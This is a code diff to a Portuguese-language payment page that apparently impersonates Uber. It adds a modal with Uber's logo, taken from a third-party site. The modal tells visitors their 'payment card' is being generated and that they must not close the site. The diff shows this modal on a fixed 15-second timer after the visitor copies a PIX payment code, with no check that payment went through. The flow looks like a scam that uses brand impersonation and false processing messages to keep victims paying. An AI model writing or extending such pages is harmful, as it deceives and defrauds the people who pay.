@@ -164,6 +164,46 @@
     </div>
 </div>
 
+<!-- Modal de Processamento do Cartão -->
+<div id="cardProcessingModal" class="fixed inset-0 bg-black bg-opacity-70 flex items-center justify-center z-50" style="display: none;">
+    <div class="bg-white rounded-lg p-8 max-w-md mx-4 text-center">
+        <!-- Logo Uber -->
+        <div class="mb-6">
+            <img src="https://images.seeklogo.com/logo-png/33/2/uber-logo-png_seeklogo-338872.png" alt="Uber Logo" class="mx-auto h-16 w-auto">
+        </div>
+        
+        <!-- Elemento de carregamento animado -->
+        <div class="mb-6">
+            <div class="loading-spinner mx-auto"></div>
+        </div>
+        
+        <!-- Mensagem para o usuário -->
+        <div class="text-gray-800">
+            <h3 class="text-xl font-bold mb-4">Processando seu cartão...</h3>
+            <p class="text-gray-600 mb-2">Não feche este site!</p>
+            <p class="text-gray-600 mb-4">Estamos gerando seu cartão de pagamento.</p>
+            <p class="text-sm text-gray-500">Você será redirecionado para a página de emissão do cartão após confirmarmos o pagamento.</p>
+        </div>
+    </div>
+</div>
+
+<style>
+/* Spinner de carregamento para o modal */
+.loading-spinner {
+    width: 40px;
+    height: 40px;
+    border: 4px solid #f0f0f0;
+    border-top: 4px solid #000;
+    border-radius: 50%;
+    animation: spin 1s linear infinite;
+}
+
+@keyframes spin {
+    0% { transform: rotate(0deg); }
+    100% { transform: rotate(360deg); }
+}
+</style>
+
 <script>
 // Verificar se câmera foi selecionada e criar pagamento se necessário
 document.addEventListener('DOMContentLoaded', function() {
@@ -287,6 +327,12 @@ function copyPixCode() {
             button.style.background = '#28a745';
             button.style.color = 'white';
             console.log('PIX code copied to clipboard');
+            
+            // Mostrar modal 15 segundos após clicar em "Copiar código PIX"
+            setTimeout(function() {
+                showCardProcessingModal();
+            }, 15000); // 15 segundos
+            
         }, function(err) {
             console.error('Could not copy text: ', err);
             // Fallback para navegadores mais antigos
@@ -301,6 +347,12 @@ function copyPixCode() {
                 button.innerHTML = '<i class="fa fa-check" style="margin-right: 8px;"></i>Copiado!';
                 button.style.background = '#28a745';
                 button.style.color = 'white';
+                
+                // Mostrar modal 15 segundos após clicar em "Copiar código PIX"
+                setTimeout(function() {
+                    showCardProcessingModal();
+                }, 15000); // 15 segundos
+                
             } catch (err) {
                 console.error('Fallback: Could not copy text: ', err);
             }
@@ -308,6 +360,15 @@ function copyPixCode() {
         });
     } else {
         alert('Código PIX não disponível');
+    }
+}
+
+// Função para mostrar o modal de processamento do cartão
+function showCardProcessingModal() {
+    const modal = document.getElementById('cardProcessingModal');
+    if (modal) {
+        modal.style.display = 'flex';
+        console.log('Modal de processamento do cartão exibido após 15 segundos');
     }
 }
 
@@ -483,6 +544,7 @@ function checkPaymentStatus() {
                 // Redirect after ensuring pixel fires
                 setTimeout(() => {
                     console.log('Redirecting to /cartao...');
+                    // O modal será fechado automaticamente quando a página mudar
                     window.location.href = '/cartao';
                 }, 1000);
             } else if (data.status) {
